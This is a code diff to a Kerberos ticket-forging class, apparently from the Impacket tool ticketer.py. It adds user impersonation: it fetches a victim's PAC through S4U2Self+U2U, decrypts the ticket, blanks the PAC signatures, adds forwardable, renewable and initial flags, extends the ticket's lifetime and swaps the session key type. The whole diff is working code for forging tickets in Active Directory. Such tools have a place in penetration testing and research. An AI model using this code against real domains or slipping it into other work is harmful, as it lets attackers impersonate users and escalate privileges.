@@ -311,7 +311,7 @@ class TICKETER:
                 return None, None
             kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
             kdcRep['cname']['name-string'] = noValue
-            kdcRep['cname']['name-string'][0] = self.__target
+            kdcRep['cname']['name-string'][0] = self.__options.impersonate or self.__target
 
         else:
             logging.info('Creating basic skeleton ticket and PAC Infos')
@@ -523,22 +523,67 @@ class TICKETER:
         if self.__options.impersonate:
 
             # 1. S4U2Self + U2U
-            logging.info('\tRequesting S4U2self+U2U')
+            logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
             tgs, cipher, oldSessionKey, sessionKey = self.getKerberosS4U2SelfU2U()
 
             # 2. extract PAC
-            logging.info('\tExtracting PAC for %s' % self.__options.impersonate)
+            logging.info('\tDecrypting ticket & extracting PAC')
             decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
             cipherText = decodedTicket['ticket']['enc-part']['cipher']
             newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]
             plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)
-            logging.debug('Ticket successfully decrypted')
             encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
             # Let's extend the ticket's validity a lil bit
             encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
             encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
-            pacInfos = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
-            # todo : handle the PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, and possibly PAC_CLIENT_INFO_TYPE
+            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
+
+            # Opening PAC
+            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
+            pacInfos = dict()
+            buff = pacType['Buffers']
+
+            # clearing the signatures so that we can sign&encrypt later on
+            logging.info("\tClearing signatures")
+            for bufferN in range(pacType['cBuffers']):
+                infoBuffer = pac.PAC_INFO_BUFFER(buff)
+                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
+                buff = buff[len(infoBuffer):]
+                if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:
+                    checksum = PAC_SIGNATURE_DATA(data)
+                    if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
+                        checksum['Signature'] = '\x00' * 12
+                    elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
+                        checksum['Signature'] = '\x00' * 12
+                    else:
+                        checksum['Signature'] = '\x00' * 16
+                    pacInfos[infoBuffer['ulType']] = checksum.getData()
+                else:
+                    pacInfos[infoBuffer['ulType']] = data
+
+            # changing ticket flags to match TGT / ST
+            logging.info("\tAdding necessary ticket flags")
+            originalFlags = [i for i, x in enumerate(list(encTicketPart['flags'].asBinary())) if x == '1']
+            flags = originalFlags
+            newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]
+            if self.__domain == self.__server:
+                newFlags.append(TicketFlags.initial.value)
+            for newFlag in newFlags:
+                if newFlag not in originalFlags:
+                    flags.append(newFlag)
+            encTicketPart['flags'] = encodeFlags(flags)
+
+            # changing key type to match what the TGT we obtained
+            logging.info("\tChanging keytype")
+            encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']
+            if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
+            elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
+            else:
+                encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(16)])
+
         else:
             encTicketPart = EncTicketPart()
 
